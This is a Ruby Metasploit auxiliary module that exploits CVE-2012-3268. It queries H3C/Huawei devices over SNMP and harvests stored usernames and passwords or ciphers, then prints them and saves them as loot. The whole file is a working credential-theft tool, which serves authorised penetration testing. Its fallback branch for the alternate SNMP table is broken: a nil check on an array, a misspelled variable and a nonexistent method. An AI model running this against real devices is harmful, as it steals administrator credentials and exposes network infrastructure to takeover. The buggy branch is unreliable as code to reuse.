require 'msf/core'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::Remote::SNMPClient
	include Msf::Auxiliary::Report
	include Msf::Auxiliary::Scanner

	def initialize
		super(
			'Name'		=> 'Huawei/H3C SNMP Login Credential Grabber',
			'Description' => %q{
				This module will obtain the username and password/cipher from
				an HP/H3C or Huawei device via SNMP. A valid SNMP community
				string is required. Prior to Oct 2012 this could be the
				read-only string.
			},
			'Author'	  => [ 'Kurt Grutzmacher <grutz[at]jingojango.net>' ],
			'License'	 => MSF_LICENSE,
			'References'  =>
			[
				[ 'URL', 'http://grutztopia.jingojango.net/2012/10/hph3c-and-huawei-snmp-weak-access-to.html' ],
				[ 'URL', 'https://h20565.www2.hp.com/portal/site/hpsc/public/kb/docDisplay/?docId=emr_na-c03515685&ac.admitted=1350939600802.876444892.492883150' ],
				[ 'CVE', '2012-3268' ],
				[ 'US-CERT-VU', '225404' ],
			],
			)
		end

		def run_host(ip)
			begin
				snmp = connect_snmp

				user_tbl_h3c = [
					"1.3.6.1.4.1.2011.10.2.12.1.1.1.1",  # h3cUserName
					"1.3.6.1.4.1.2011.10.2.12.1.1.1.2",  # h3cUserPassword
					"1.3.6.1.4.1.2011.10.2.12.1.1.1.3",  # h3cAuthMode
					"1.3.6.1.4.1.2011.10.2.12.1.1.1.4",  # h3cUserLevel
					"1.3.6.1.4.1.2011.10.2.12.1.1.1.5",  # h3cUserState
				]

				user_tbl_hh3c = [
					"1.3.6.1.4.1.25506.2.12.1.1.1.1",  # hh3cUserName
					"1.3.6.1.4.1.25506.2.12.1.1.1.2",  # hh3cUserPassword
					"1.3.6.1.4.1.25506.2.12.1.1.1.3",  # hh3cAuthMode
					"1.3.6.1.4.1.25506.2.12.1.1.1.4",  # hh3cUserLevel
					"1.3.6.1.4.1.25506.2.12.1.1.1.5",  # hh3cUserState
				]

				@users = []
				sysdescr = snmp.get_value('sysDescr.0')
				if sysdescr =~ /H3C|Huawei/i
					snmp.walk(user_tbl_h3c) do |row|
						@users << row.collect{|x|x.value}
					end
					if @users.nil?
						# No users? Lets try hh3c (25506) instead of h3c
						# (2011.10)
						user_new = []
						snmp.walk(user_tbl_hh3c) do |row|
							@user << row.collection{|x|x.value}
						end
					end
				else
					print_good("#{ip} is not an H3C or Huawei device. SNMP reports: #{sysdescr}")
				end

				disconnect_snmp

				if not @users.empty?
					tbl  = Rex::Ui::Text::Table.new(
						'Header'  => 'Huawei/H3C Device Logins',
						'Indent'  => 1,
						'Columns' => ['IP Address', 'Username', 'Password/Cipher', 'Auth Mode', 'User Level', 'User State']
					)
					@users.map{ |user|
						tbl << [ip, user[0], user[1], user[2], user[3], user[4]]
						report_auth_info(
							:host  => ip,
							:port  => '161',
							:sname => 'snmp',
							:user  => user[0],
							:pass  => user[1],
							:type  => "hh3c_logins"
						)
					}
					store_loot(
						'host.hh3c.users',
						'text/plain',
						ip,
						tbl.to_csv,
						"#{ip}_huawei_h3c_users.txt",
						"Huawei/H3C Users/Passwords"
					)
					print_good(tbl.to_s)
				end
			rescue SNMP::RequestTimeout
				vprint_status("#{ip}, SNMP request timeout.")
			rescue Errno::ECONNREFUSED
				print_status("#{ip}, Connection refused.")
			rescue SNMP::InvalidIpAddress
				print_status("#{ip}, Invalid Ip Address. Check it with 'snmpwalk tool'.")
			rescue SNMP::UnsupportedVersion
				print_status("Unsupported SNMP version specified. Select from '1' or '2c'.")
			rescue ::Interrupt
				raise $!
			rescue ::Exception => e
				print_status("Unknown error: #{e.class} #{e}")
			end
	end

end
